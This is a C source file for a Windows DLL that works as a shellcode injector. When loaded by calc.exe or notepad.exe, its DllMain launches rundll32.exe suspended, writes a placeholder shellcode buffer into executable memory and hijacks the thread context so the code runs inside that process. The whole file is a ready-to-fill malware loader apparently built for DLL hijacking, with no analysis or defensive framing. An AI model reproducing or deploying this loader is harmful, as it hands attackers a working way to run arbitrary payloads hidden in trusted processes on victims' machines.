#include <windows.h>

/* dont whip ur ass here plz
 * Written bY AuxgREP
 * 2019 and Updated on 2022 by AuxGrep
*/


#define SCSIZE 2048
unsigned char code[SCSIZE] = "PUT YOUR SHELLCODE HERE";
 
 


#define MAXFILEPATHLEN	2048

void inline_bzero(void *p, size_t l)
{
   
           BYTE *q = (BYTE *)p;
           size_t x = 0;
           for (x = 0; x < l; x++)
                     *(q++) = 0x00;
}

char* filenamecheck(char *str, char *target) {
  if (!*target) return str;
  char *p1 = (char*)str;
  while (*p1) {
    char *p1Begin = p1, *p2 = (char*)target;
    while (*p1 && *p2 && *p1 == *p2) {
      p1++;
      p2++;
    }
    if (!*p2)
      return p1Begin;
    p1 = p1Begin + 1;
  }
  return NULL;
}



void ExecutePayload(void);

BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{

    TCHAR filePath[2048];
    TCHAR victimPrograms[2][1024] = { "calc.exe", "notepad.exe" };
    int i;

    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:

	   GetModuleFileName(NULL, filePath, MAXFILEPATHLEN);
	   for(i = 0; i < 2; i++)  
	   {
		if (filenamecheck(filePath, victimPrograms[i]) != NULL)
		{
			ExecutePayload();
			break;
		}

           }
						
            break;

        case DLL_PROCESS_DETACH:
             
            break;

        case DLL_THREAD_ATTACH:
            
            break;

        case DLL_THREAD_DETACH:
             
            break;
    }
    return TRUE;
}

void ExecutePayload(void) {
    int error;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	CONTEXT ctx;
	DWORD prot;
   LPVOID ep;

	
	inline_bzero( &si, sizeof( si ));
	si.cb = sizeof(si);

	
	if(CreateProcess( 0, "rundll32.exe", 0, 0, 0, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, 0, 0, &si, &pi)) {
		ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;
		GetThreadContext(pi.hThread, &ctx);

	   ep = (LPVOID) VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, SCSIZE, 0);

	   ctx.Rip = (DWORD64)ep;

        SetThreadContext(pi.hThread,&ctx);

        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
	}
}



